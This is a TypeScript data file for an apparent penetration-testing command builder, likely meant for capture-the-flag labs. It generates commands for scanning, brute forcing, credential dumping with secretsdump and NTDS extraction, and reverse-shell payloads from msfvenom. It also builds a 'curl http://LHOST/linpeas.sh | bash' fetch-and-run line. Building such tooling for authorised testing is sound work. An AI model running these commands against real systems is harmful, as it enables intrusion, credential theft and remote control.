export interface ToolParam {
  id: string;
  label: string;
  type: 'text' | 'select';
  default?: string;
  placeholder?: string;
  autoFill?: 'ip' | 'url';
  options?: string[];
}

export interface Tool {
  id: string;
  label: string;
  category: string;
  description: string;
  install: string;
  referenceUrl: string;
  params: ToolParam[];
  buildCommand(params: Record<string, string>): string;
}

export interface ToolCategory {
  id: string;
  label: string;
}

export const TOOL_CATEGORIES: ToolCategory[] = [
  { id: 'recon',  label: 'Recon' },
  { id: 'web',    label: 'Web' },
  { id: 'smb-ad', label: 'SMB / AD' },
  { id: 'auth',   label: 'Auth' },
  { id: 'exploit',label: 'Exploit' },
  { id: 'post',   label: 'Post-Exploit' },
  { id: 'net',    label: 'Net' },
  { id: 'osint',  label: 'OSINT' },
  { id: 'misc',   label: 'Misc' },
];

export const TOOLS: Tool[] = [
  // RECON
  {
    id: 'nmap-quick', label: 'nmap (quick)', category: 'recon',
    description: 'Quick top-port scan with service detection',
    install: 'sudo apt install nmap',
    referenceUrl: 'https://nmap.org/book/man.html',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'ports', label: 'Ports', type: 'text', default: '-', placeholder: '- (all) or 1-1000' },
      { id: 'flags', label: 'Extra Flags', type: 'text', default: '', placeholder: '-v --open' },
    ],
    buildCommand(p) {
      const ports = p.ports === '-' ? '-p-' : (p.ports ? `-p ${p.ports}` : '--top-ports 1000');
      return `nmap -sV -sC ${ports} --min-rate 5000 ${p.flags || ''} ${p.target}`.trim();
    }
  },
  {
    id: 'nmap-full', label: 'nmap (full)', category: 'recon',
    description: 'Full aggressive scan with OS detection',
    install: 'sudo apt install nmap',
    referenceUrl: 'https://nmap.org/book/man.html',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'timing', label: 'Timing', type: 'select', default: '-T4', options: ['-T1','-T2','-T3','-T4','-T5'] },
      { id: 'output', label: 'Output File (no ext)', type: 'text', default: '', placeholder: 'nmap_results' },
    ],
    buildCommand(p) {
      const out = p.output ? `-oA ${p.output}` : '';
      return `sudo nmap -A ${p.timing || '-T4'} -p- ${out} ${p.target}`.trim();
    }
  },
  {
    id: 'nmap-udp', label: 'nmap (UDP)', category: 'recon',
    description: 'UDP scan of top ports',
    install: 'sudo apt install nmap',
    referenceUrl: 'https://nmap.org/book/man.html',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'top', label: 'Top N Ports', type: 'text', default: '100', placeholder: '100' },
    ],
    buildCommand(p) {
      return `sudo nmap -sU --top-ports ${p.top || 100} -sV ${p.target}`;
    }
  },
  {
    id: 'nmap-script', label: 'nmap (script)', category: 'recon',
    description: 'Run specific NSE scripts',
    install: 'sudo apt install nmap',
    referenceUrl: 'https://nmap.org/nsedoc/',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'port', label: 'Port', type: 'text', default: '', placeholder: '445' },
      { id: 'script', label: 'Script', type: 'text', default: 'vuln', placeholder: 'smb-vuln-ms17-010' },
    ],
    buildCommand(p) {
      const port = p.port ? `-p ${p.port}` : '';
      return `nmap ${port} --script=${p.script || 'vuln'} ${p.target}`.trim();
    }
  },
  {
    id: 'masscan', label: 'masscan', category: 'recon',
    description: 'Ultra-fast port scanner',
    install: 'sudo apt install masscan',
    referenceUrl: 'https://github.com/robertdavidgraham/masscan',
    params: [
      { id: 'target', label: 'Target IP/Range', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'ports', label: 'Ports', type: 'text', default: '1-65535', placeholder: '1-65535' },
      { id: 'rate', label: 'Rate (pps)', type: 'text', default: '1000', placeholder: '1000' },
    ],
    buildCommand(p) {
      return `sudo masscan -p${p.ports || '1-65535'} ${p.target} --rate=${p.rate || 1000} -e tun0`;
    }
  },
  {
    id: 'rustscan', label: 'rustscan', category: 'recon',
    description: 'Fast port scanner that feeds into nmap',
    install: 'cargo install rustscan  # or download binary',
    referenceUrl: 'https://github.com/RustScan/RustScan',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'batch', label: 'Batch Size', type: 'text', default: '5000', placeholder: '5000' },
    ],
    buildCommand(p) {
      return `rustscan -a ${p.target} -b ${p.batch || 5000} -- -sV -sC`;
    }
  },

  // WEB
  {
    id: 'gobuster-dir', label: 'gobuster (dir)', category: 'web',
    description: 'Directory/file bruteforce',
    install: 'sudo apt install gobuster',
    referenceUrl: 'https://github.com/OJ/gobuster',
    params: [
      { id: 'url', label: 'URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x' },
      { id: 'wordlist', label: 'Wordlist', type: 'text', default: '/usr/share/wordlists/dirb/common.txt', placeholder: '/usr/share/seclists/...' },
      { id: 'ext', label: 'Extensions', type: 'text', default: '', placeholder: 'php,txt,html,bak' },
      { id: 'threads', label: 'Threads', type: 'text', default: '50', placeholder: '50' },
      { id: 'extra', label: 'Extra Flags', type: 'text', default: '', placeholder: '--no-error -q' },
    ],
    buildCommand(p) {
      const ext = p.ext ? `-x ${p.ext}` : '';
      return `gobuster dir -u ${p.url} -w ${p.wordlist} ${ext} -t ${p.threads || 50} ${p.extra || ''}`.trim();
    }
  },
  {
    id: 'gobuster-vhost', label: 'gobuster (vhost)', category: 'web',
    description: 'Virtual host / subdomain discovery',
    install: 'sudo apt install gobuster',
    referenceUrl: 'https://github.com/OJ/gobuster',
    params: [
      { id: 'url', label: 'URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x' },
      { id: 'wordlist', label: 'Wordlist', type: 'text', default: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', placeholder: 'subdomains wordlist' },
    ],
    buildCommand(p) {
      return `gobuster vhost -u ${p.url} -w ${p.wordlist} --append-domain`;
    }
  },
  {
    id: 'ffuf', label: 'ffuf', category: 'web',
    description: 'Fast web fuzzer (dirs, params, vhosts)',
    install: 'sudo apt install ffuf',
    referenceUrl: 'https://github.com/ffuf/ffuf',
    params: [
      { id: 'url', label: 'URL with FUZZ', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x/FUZZ' },
      { id: 'wordlist', label: 'Wordlist', type: 'text', default: '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt', placeholder: 'wordlist path' },
      { id: 'ext', label: 'Extensions', type: 'text', default: '', placeholder: 'php,txt,html' },
      { id: 'fc', label: 'Filter Codes', type: 'text', default: '404', placeholder: '404,403' },
      { id: 'mc', label: 'Match Codes', type: 'text', default: '', placeholder: '200,301,302' },
    ],
    buildCommand(p) {
      const ext = p.ext ? `-e .${p.ext.split(',').join(',.')}` : '';
      const fc = p.fc ? `-fc ${p.fc}` : '';
      const mc = p.mc ? `-mc ${p.mc}` : '';
      return `ffuf -u ${p.url} -w ${p.wordlist} ${ext} ${fc} ${mc} -v`.trim().replace(/\s+/g, ' ');
    }
  },
  {
    id: 'feroxbuster', label: 'feroxbuster', category: 'web',
    description: 'Recursive content discovery',
    install: 'sudo apt install feroxbuster',
    referenceUrl: 'https://github.com/epi052/feroxbuster',
    params: [
      { id: 'url', label: 'URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x' },
      { id: 'wordlist', label: 'Wordlist', type: 'text', default: '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt', placeholder: 'wordlist' },
      { id: 'ext', label: 'Extensions', type: 'text', default: '', placeholder: 'php,txt,html' },
    ],
    buildCommand(p) {
      const ext = p.ext ? `-x ${p.ext}` : '';
      return `feroxbuster -u ${p.url} -w ${p.wordlist} ${ext} --auto-tune`.trim();
    }
  },
  {
    id: 'nikto', label: 'nikto', category: 'web',
    description: 'Web server vulnerability scanner',
    install: 'sudo apt install nikto',
    referenceUrl: 'https://github.com/sullo/nikto',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'port', label: 'Port', type: 'text', default: '80', placeholder: '80' },
      { id: 'ssl', label: 'SSL', type: 'select', default: 'no', options: ['no', 'yes'] },
    ],
    buildCommand(p) {
      const ssl = p.ssl === 'yes' ? '-ssl' : '';
      return `nikto -h ${p.target} -p ${p.port || 80} ${ssl}`.trim();
    }
  },
  {
    id: 'wpscan', label: 'wpscan', category: 'web',
    description: 'WordPress vulnerability scanner',
    install: 'sudo apt install wpscan',
    referenceUrl: 'https://github.com/wpscanteam/wpscan',
    params: [
      { id: 'url', label: 'WordPress URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x' },
      { id: 'mode', label: 'Enumerate', type: 'text', default: 'u,p,t', placeholder: 'u,p,t,vp,vt' },
      { id: 'apikey', label: 'WPScan API Key', type: 'text', default: '', placeholder: 'optional' },
    ],
    buildCommand(p) {
      const api = p.apikey ? `--api-token ${p.apikey}` : '';
      return `wpscan --url ${p.url} --enumerate ${p.mode || 'u,p,t'} ${api}`.trim();
    }
  },
  {
    id: 'sqlmap', label: 'sqlmap', category: 'web',
    description: 'Automated SQL injection detection & exploitation',
    install: 'sudo apt install sqlmap',
    referenceUrl: 'https://sqlmap.org',
    params: [
      { id: 'url', label: 'URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x/page?id=1' },
      { id: 'data', label: 'POST Data', type: 'text', default: '', placeholder: 'username=admin&password=test' },
      { id: 'level', label: 'Level', type: 'select', default: '2', options: ['1','2','3','4','5'] },
      { id: 'risk', label: 'Risk', type: 'select', default: '1', options: ['1','2','3'] },
      { id: 'dbs', label: 'Dump DBs', type: 'select', default: 'yes', options: ['yes','no'] },
    ],
    buildCommand(p) {
      const data = p.data ? `--data="${p.data}"` : '';
      const dbs = p.dbs === 'yes' ? '--dbs' : '';
      return `sqlmap -u "${p.url}" ${data} --level=${p.level || 2} --risk=${p.risk || 1} ${dbs} --batch`.trim().replace(/\s+/g, ' ');
    }
  },

  // SMB / AD
  {
    id: 'smbclient', label: 'smbclient', category: 'smb-ad',
    description: 'SMB share enumeration and file access',
    install: 'sudo apt install smbclient',
    referenceUrl: 'https://www.samba.org/samba/docs/current/man-html/smbclient.1.html',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'share', label: 'Share Name', type: 'text', default: '', placeholder: 'SYSVOL (or leave blank to list)' },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'anonymous' },
      { id: 'pass', label: 'Password', type: 'text', default: '', placeholder: '(blank for anon)' },
    ],
    buildCommand(p) {
      if (!p.share) {
        const creds = p.user ? `-U "${p.user}%${p.pass || ''}"` : '-N';
        return `smbclient -L //${p.target} ${creds}`;
      }
      const creds = p.user ? `-U "${p.user}%${p.pass || ''}"` : '-N';
      return `smbclient //${p.target}/${p.share} ${creds}`;
    }
  },
  {
    id: 'enum4linux', label: 'enum4linux', category: 'smb-ad',
    description: 'SMB/LDAP enumeration for Linux',
    install: 'sudo apt install enum4linux',
    referenceUrl: 'https://github.com/CiscoCXSecurity/enum4linux',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'mode', label: 'Mode', type: 'select', default: '-a', options: ['-a','-u','-g','-s','-p','-r'] },
    ],
    buildCommand(p) {
      return `enum4linux ${p.mode || '-a'} ${p.target}`;
    }
  },
  {
    id: 'crackmapexec', label: 'crackmapexec', category: 'smb-ad',
    description: 'SMB/AD Swiss army knife',
    install: 'sudo apt install crackmapexec',
    referenceUrl: 'https://github.com/Porchetta-Industries/CrackMapExec',
    params: [
      { id: 'target', label: 'Target IP/Range', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'proto', label: 'Protocol', type: 'select', default: 'smb', options: ['smb','winrm','rdp','ldap','mssql'] },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'administrator' },
      { id: 'pass', label: 'Password/Hash', type: 'text', default: '', placeholder: 'password or :NThash' },
      { id: 'action', label: 'Action', type: 'select', default: '--shares', options: ['--shares','--users','--groups','--pass-pol','--sessions','--loggedon-users','--rid-brute','--sam','--lsa','--ntds'] },
    ],
    buildCommand(p) {
      const creds = p.user ? `-u "${p.user}" -p "${p.pass || ''}"` : '';
      return `crackmapexec ${p.proto || 'smb'} ${p.target} ${creds} ${p.action || ''}`.trim();
    }
  },
  {
    id: 'impacket-secretsdump', label: 'secretsdump', category: 'smb-ad',
    description: 'Dump SAM/NTDS hashes via DCSync or SMB',
    install: 'sudo apt install python3-impacket',
    referenceUrl: 'https://github.com/fortra/impacket',
    params: [
      { id: 'domain', label: 'Domain', type: 'text', default: '', placeholder: 'CORP.LOCAL' },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'administrator' },
      { id: 'pass', label: 'Password', type: 'text', default: '', placeholder: 'P@ssword1' },
      { id: 'target', label: 'DC IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
    ],
    buildCommand(p) {
      return `impacket-secretsdump ${p.domain || 'WORKGROUP'}/${p.user}:${p.pass}@${p.target}`;
    }
  },
  {
    id: 'impacket-psexec', label: 'psexec', category: 'smb-ad',
    description: 'Remote code execution via SMB (Impacket)',
    install: 'sudo apt install python3-impacket',
    referenceUrl: 'https://github.com/fortra/impacket',
    params: [
      { id: 'domain', label: 'Domain', type: 'text', default: '.', placeholder: 'CORP.LOCAL or .' },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'administrator' },
      { id: 'pass', label: 'Password', type: 'text', default: '', placeholder: 'P@ssword1' },
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
    ],
    buildCommand(p) {
      return `impacket-psexec ${p.domain || '.'}/${p.user}:${p.pass}@${p.target}`;
    }
  },
  {
    id: 'bloodhound', label: 'bloodhound-python', category: 'smb-ad',
    description: 'AD attack path data collection',
    install: 'pip3 install bloodhound',
    referenceUrl: 'https://github.com/fox-it/BloodHound.py',
    params: [
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'user' },
      { id: 'pass', label: 'Password', type: 'text', default: '', placeholder: 'password' },
      { id: 'domain', label: 'Domain', type: 'text', default: '', placeholder: 'CORP.LOCAL' },
      { id: 'dc', label: 'DC IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
    ],
    buildCommand(p) {
      return `bloodhound-python -u ${p.user} -p '${p.pass}' -d ${p.domain} -dc ${p.dc} -c all --zip`;
    }
  },
  {
    id: 'kerberoast', label: 'GetUserSPNs', category: 'smb-ad',
    description: 'Kerberoasting — request TGS tickets for cracking',
    install: 'sudo apt install python3-impacket',
    referenceUrl: 'https://github.com/fortra/impacket',
    params: [
      { id: 'domain', label: 'Domain', type: 'text', default: '', placeholder: 'CORP.LOCAL' },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'user' },
      { id: 'pass', label: 'Password', type: 'text', default: '', placeholder: 'password' },
      { id: 'dc', label: 'DC IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
    ],
    buildCommand(p) {
      return `impacket-GetUserSPNs ${p.domain}/${p.user}:${p.pass} -dc-ip ${p.dc} -request -outputfile kerberoast.hash`;
    }
  },
  {
    id: 'asrep', label: 'GetNPUsers', category: 'smb-ad',
    description: 'AS-REP Roasting — users without pre-auth',
    install: 'sudo apt install python3-impacket',
    referenceUrl: 'https://github.com/fortra/impacket',
    params: [
      { id: 'domain', label: 'Domain', type: 'text', default: '', placeholder: 'CORP.LOCAL' },
      { id: 'dc', label: 'DC IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'usersfile', label: 'Users File', type: 'text', default: 'users.txt', placeholder: 'users.txt' },
    ],
    buildCommand(p) {
      return `impacket-GetNPUsers ${p.domain}/ -usersfile ${p.usersfile} -dc-ip ${p.dc} -no-pass -format hashcat`;
    }
  },
  {
    id: 'evil-winrm', label: 'evil-winrm', category: 'smb-ad',
    description: 'WinRM shell (PowerShell remoting)',
    install: 'gem install evil-winrm',
    referenceUrl: 'https://github.com/Hackplayers/evil-winrm',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'administrator' },
      { id: 'pass', label: 'Password', type: 'text', default: '', placeholder: 'password' },
      { id: 'hash', label: 'NT Hash (or blank)', type: 'text', default: '', placeholder: 'optional NTLM hash' },
    ],
    buildCommand(p) {
      if (p.hash) return `evil-winrm -i ${p.target} -u ${p.user} -H ${p.hash}`;
      return `evil-winrm -i ${p.target} -u ${p.user} -p '${p.pass}'`;
    }
  },

  // AUTH
  {
    id: 'hydra', label: 'hydra', category: 'auth',
    description: 'Network brute force tool',
    install: 'sudo apt install hydra',
    referenceUrl: 'https://github.com/vanhauser-thc/thc-hydra',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'service', label: 'Service', type: 'select', default: 'ssh', options: ['ssh','ftp','smb','rdp','http-post-form','mysql','mssql','vnc','telnet','pop3','smtp','imap'] },
      { id: 'user', label: 'Username / File', type: 'text', default: 'admin', placeholder: 'admin or users.txt' },
      { id: 'wordlist', label: 'Password Wordlist', type: 'text', default: '/usr/share/wordlists/rockyou.txt', placeholder: 'rockyou.txt' },
      { id: 'threads', label: 'Threads', type: 'text', default: '16', placeholder: '16' },
      { id: 'extra', label: 'Extra (for http-post-form)', type: 'text', default: '', placeholder: '/login:user=^USER^&pass=^PASS^:Invalid' },
    ],
    buildCommand(p) {
      const userFlag = p.user && p.user.endsWith('.txt') ? `-L ${p.user}` : `-l ${p.user}`;
      const passFlag = `-P ${p.wordlist}`;
      const extra = p.extra && p.service === 'http-post-form' ? `"${p.extra}"` : '';
      return `hydra -t ${p.threads || 16} ${userFlag} ${passFlag} ${p.service} ${p.target}${extra ? ' ' + extra : ''}`.trim();
    }
  },
  {
    id: 'john', label: 'john', category: 'auth',
    description: 'John the Ripper hash cracker',
    install: 'sudo apt install john',
    referenceUrl: 'https://www.openwall.com/john/',
    params: [
      { id: 'hashfile', label: 'Hash File', type: 'text', default: 'hash.txt', placeholder: 'hashes.txt' },
      { id: 'wordlist', label: 'Wordlist', type: 'text', default: '/usr/share/wordlists/rockyou.txt', placeholder: 'rockyou.txt' },
      { id: 'format', label: 'Format', type: 'text', default: '', placeholder: 'NT, md5crypt, sha256crypt (optional)' },
      { id: 'rules', label: 'Rules', type: 'text', default: '', placeholder: 'best64 (optional)' },
    ],
    buildCommand(p) {
      const fmt = p.format ? `--format=${p.format}` : '';
      const rules = p.rules ? `--rules=${p.rules}` : '';
      return `john ${p.hashfile} --wordlist=${p.wordlist} ${fmt} ${rules}`.trim().replace(/\s+/g, ' ');
    }
  },
  {
    id: 'hashcat', label: 'hashcat', category: 'auth',
    description: 'GPU-accelerated hash cracker',
    install: 'sudo apt install hashcat',
    referenceUrl: 'https://hashcat.net/wiki/',
    params: [
      { id: 'hashfile', label: 'Hash File', type: 'text', default: 'hash.txt', placeholder: 'hash.txt' },
      { id: 'mode', label: 'Mode (-m)', type: 'text', default: '0', placeholder: '0=MD5, 1000=NTLM, 1800=sha512crypt' },
      { id: 'wordlist', label: 'Wordlist', type: 'text', default: '/usr/share/wordlists/rockyou.txt', placeholder: 'rockyou.txt' },
      { id: 'rules', label: 'Rules File', type: 'text', default: '', placeholder: '/usr/share/hashcat/rules/best64.rule' },
      { id: 'attack', label: 'Attack Mode', type: 'select', default: '0', options: ['0 (dictionary)','3 (brute force)','6 (hybrid wordlist+mask)'] },
    ],
    buildCommand(p) {
      const rules = p.rules ? `-r ${p.rules}` : '';
      const atk = p.attack ? `-a ${p.attack.split(' ')[0]}` : '-a 0';
      return `hashcat ${atk} -m ${p.mode || 0} ${p.hashfile} ${p.wordlist} ${rules} --force`.trim().replace(/\s+/g, ' ');
    }
  },

  // EXPLOIT
  {
    id: 'searchsploit', label: 'searchsploit', category: 'exploit',
    description: 'Exploit-DB offline search',
    install: 'sudo apt install exploitdb',
    referenceUrl: 'https://www.exploit-db.com',
    params: [
      { id: 'query', label: 'Search Query', type: 'text', default: '', placeholder: 'Apache 2.4.49' },
      { id: 'flags', label: 'Flags', type: 'text', default: '', placeholder: '--www -t (title only)' },
    ],
    buildCommand(p) {
      return `searchsploit ${p.flags || ''} "${p.query}"`.trim();
    }
  },
  {
    id: 'msfvenom', label: 'msfvenom', category: 'exploit',
    description: 'Payload generator',
    install: 'sudo apt install metasploit-framework',
    referenceUrl: 'https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html',
    params: [
      { id: 'payload', label: 'Payload', type: 'select', default: 'linux/x64/shell_reverse_tcp', options: [
        'linux/x64/shell_reverse_tcp','linux/x64/meterpreter/reverse_tcp',
        'windows/x64/shell_reverse_tcp','windows/x64/meterpreter/reverse_tcp',
        'windows/x64/shell/reverse_tcp','php/reverse_php','java/jsp_shell_reverse_tcp',
      ]},
      { id: 'lhost', label: 'LHOST (Your IP)', type: 'text', default: '', placeholder: '10.10.14.x' },
      { id: 'lport', label: 'LPORT', type: 'text', default: '4444', placeholder: '4444' },
      { id: 'format', label: 'Format', type: 'select', default: 'elf', options: ['elf','exe','raw','war','jar','php','asp','aspx','ps1','sh','py'] },
      { id: 'output', label: 'Output File', type: 'text', default: 'shell', placeholder: 'shell' },
    ],
    buildCommand(p) {
      const ext: Record<string,string> = { elf:'', exe:'.exe', php:'.php', asp:'.asp', aspx:'.aspx', ps1:'.ps1', sh:'.sh', py:'.py', war:'.war', jar:'.jar', raw:'.bin' };
      const outfile = `${p.output || 'shell'}${ext[p.format] || ''}`;
      return `msfvenom -p ${p.payload} LHOST=${p.lhost} LPORT=${p.lport || 4444} -f ${p.format} -o ${outfile}`;
    }
  },

  // POST-EXPLOIT
  {
    id: 'linpeas', label: 'linpeas', category: 'post',
    description: 'Linux privilege escalation enumeration script',
    install: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',
    referenceUrl: 'https://github.com/peass-ng/PEASS-ng',
    params: [
      { id: 'lhost', label: 'Your IP (for curl method)', type: 'text', default: '', placeholder: '10.10.14.x' },
      { id: 'method', label: 'Transfer Method', type: 'select', default: 'curl', options: ['curl', 'wget', 'python3 server'] },
    ],
    buildCommand(p) {
      if (p.method === 'wget') return `wget http://${p.lhost}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh`;
      if (p.method === 'python3 server') return `# On your machine:\npython3 -m http.server 80\n# On target:\ncurl http://${p.lhost}/linpeas.sh | bash`;
      return `curl http://${p.lhost}/linpeas.sh | bash`;
    }
  },
  {
    id: 'winpeas', label: 'winpeas', category: 'post',
    description: 'Windows privilege escalation enumeration',
    install: 'Download from: https://github.com/peass-ng/PEASS-ng/releases',
    referenceUrl: 'https://github.com/peass-ng/PEASS-ng',
    params: [
      { id: 'lhost', label: 'Your IP', type: 'text', default: '', placeholder: '10.10.14.x' },
    ],
    buildCommand(p) {
      return `# Upload winPEAS.exe to target, then:\n.\\winPEAS.exe\n\n# Or via SMB server:\n# On your machine: impacket-smbserver share . -smb2support\n# On target: \\\\${p.lhost}\\share\\winPEAS.exe`;
    }
  },
  {
    id: 'pwncat', label: 'pwncat', category: 'post',
    description: 'Fancy reverse/bind shell handler with post-exploit modules',
    install: 'pip3 install pwncat-cs',
    referenceUrl: 'https://pwncat.readthedocs.io',
    params: [
      { id: 'port', label: 'Listen Port', type: 'text', default: '4444', placeholder: '4444' },
    ],
    buildCommand(p) {
      return `pwncat-cs -lp ${p.port || 4444}`;
    }
  },

  // NET
  {
    id: 'netcat', label: 'netcat', category: 'net',
    description: 'Swiss army knife of networking',
    install: 'sudo apt install netcat-openbsd',
    referenceUrl: 'https://man.openbsd.org/nc.1',
    params: [
      { id: 'mode', label: 'Mode', type: 'select', default: 'listen', options: ['listen', 'connect', 'port-scan', 'file-transfer-send', 'file-transfer-receive'] },
      { id: 'host', label: 'Host / IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'port', label: 'Port', type: 'text', default: '4444', placeholder: '4444' },
      { id: 'file', label: 'File (for transfer)', type: 'text', default: '', placeholder: 'file.txt' },
    ],
    buildCommand(p) {
      switch (p.mode) {
        case 'listen':                return `nc -lvnp ${p.port || 4444}`;
        case 'connect':               return `nc ${p.host} ${p.port || 4444}`;
        case 'port-scan':             return `nc -zv ${p.host} 1-65535 2>&1 | grep -i open`;
        case 'file-transfer-send':    return `# Receiver runs: nc -lvnp ${p.port} > ${p.file || 'received'}\nnc ${p.host} ${p.port} < ${p.file || 'file'}`;
        case 'file-transfer-receive': return `nc -lvnp ${p.port || 4444} > ${p.file || 'received_file'}`;
        default: return `nc -lvnp ${p.port || 4444}`;
      }
    }
  },
  {
    id: 'curl', label: 'curl', category: 'net',
    description: 'HTTP requests and file transfer',
    install: 'sudo apt install curl',
    referenceUrl: 'https://curl.se/docs/',
    params: [
      { id: 'url', label: 'URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x/path' },
      { id: 'method', label: 'Method', type: 'select', default: 'GET', options: ['GET','POST','PUT','DELETE','PATCH','HEAD','OPTIONS'] },
      { id: 'data', label: 'POST Data', type: 'text', default: '', placeholder: 'key=value or {"json":"body"}' },
      { id: 'headers', label: 'Headers', type: 'text', default: '', placeholder: 'Content-Type: application/json' },
      { id: 'output', label: 'Output File', type: 'text', default: '', placeholder: 'output.html' },
    ],
    buildCommand(p) {
      const data = p.data ? `-d '${p.data}'` : '';
      const hdr = p.headers ? `-H '${p.headers}'` : '';
      const out = p.output ? `-o ${p.output}` : '';
      const meth = p.method !== 'GET' ? `-X ${p.method}` : '';
      return `curl -s ${meth} ${hdr} ${data} ${out} '${p.url}'`.trim().replace(/\s+/g, ' ');
    }
  },
  {
    id: 'wget', label: 'wget', category: 'net',
    description: 'File download from web',
    install: 'sudo apt install wget',
    referenceUrl: 'https://www.gnu.org/software/wget/manual/wget.html',
    params: [
      { id: 'url', label: 'URL', type: 'text', autoFill: 'url', placeholder: 'http://10.10.10.x/file' },
      { id: 'output', label: 'Output File', type: 'text', default: '', placeholder: 'file.txt (optional)' },
    ],
    buildCommand(p) {
      const out = p.output ? `-O ${p.output}` : '';
      return `wget ${out} '${p.url}'`.trim();
    }
  },
  {
    id: 'ssh', label: 'ssh', category: 'net',
    description: 'SSH connection and tunnelling',
    install: 'sudo apt install openssh-client',
    referenceUrl: 'https://man.openbsd.org/ssh',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
      { id: 'user', label: 'Username', type: 'text', default: '', placeholder: 'user' },
      { id: 'port', label: 'Port', type: 'text', default: '22', placeholder: '22' },
      { id: 'key', label: 'Key File', type: 'text', default: '', placeholder: 'id_rsa (optional)' },
      { id: 'mode', label: 'Mode', type: 'select', default: 'connect', options: ['connect', 'local-forward', 'remote-forward', 'dynamic-socks'] },
      { id: 'fwd', label: 'Forward Ports', type: 'text', default: '', placeholder: '8080:127.0.0.1:80 (for forward modes)' },
    ],
    buildCommand(p) {
      const key = p.key ? `-i ${p.key}` : '';
      const base = `ssh ${key} -p ${p.port || 22} ${p.user}@${p.target}`.trim();
      switch (p.mode) {
        case 'local-forward':  return `${base} -L ${p.fwd || '8080:127.0.0.1:80'} -N`;
        case 'remote-forward': return `${base} -R ${p.fwd || '8080:127.0.0.1:80'} -N`;
        case 'dynamic-socks':  return `${base} -D ${p.fwd || '1080'} -N -q`;
        default: return base;
      }
    }
  },
  {
    id: 'ftp', label: 'ftp', category: 'net',
    description: 'FTP client (anon login & file download)',
    install: 'sudo apt install ftp',
    referenceUrl: 'https://linux.die.net/man/1/ftp',
    params: [
      { id: 'target', label: 'Target IP', type: 'text', autoFill: 'ip', placeholder: '10.10.10.x' },
    ],
    buildCommand(p) {
      return `ftp ${p.target}\n# At prompt: anonymous / anonymous\n# Commands: ls, get <file>, mget *, bye`;
    }
  },

  // OSINT
  {
    id: 'theharvester', label: 'theHarvester', category: 'osint',
    description: 'Email, hostname, IP harvesting from public sources',
    install: 'sudo apt install theharvester',
    referenceUrl: 'https://github.com/laramies/theHarvester',
    params: [
      { id: 'domain', label: 'Domain', type: 'text', default: '', placeholder: 'example.com' },
      { id: 'sources', label: 'Sources', type: 'text', default: 'all', placeholder: 'google,bing,shodan,dnsdumpster' },
      { id: 'limit', label: 'Result Limit', type: 'text', default: '500', placeholder: '500' },
    ],
    buildCommand(p) {
      return `theHarvester -d ${p.domain} -b ${p.sources || 'all'} -l ${p.limit || 500}`;
    }
  },
  {
    id: 'sherlock', label: 'sherlock', category: 'osint',
    description: 'Username search across social media platforms',
    install: 'pip3 install sherlock-project',
    referenceUrl: 'https://github.com/sherlock-project/sherlock',
    params: [
      { id: 'username', label: 'Username', type: 'text', default: '', placeholder: 'target_username' },
    ],
    buildCommand(p) {
      return `sherlock ${p.username} --print-found`;
    }
  },
  {
    id: 'whois', label: 'whois', category: 'osint',
    description: 'Domain registration information lookup',
    install: 'sudo apt install whois',
    referenceUrl: 'https://www.whois.net',
    params: [
      { id: 'target', label: 'Domain or IP', type: 'text', autoFill: 'ip', placeholder: 'example.com or IP' },
    ],
    buildCommand(p) {
      return `whois ${p.target}`;
    }
  },
  {
    id: 'dig', label: 'dig', category: 'osint',
    description: 'DNS lookup tool',
    install: 'sudo apt install dnsutils',
    referenceUrl: 'https://linux.die.net/man/1/dig',
    params: [
      { id: 'target', label: 'Domain / IP', type: 'text', autoFill: 'ip', placeholder: 'example.com' },
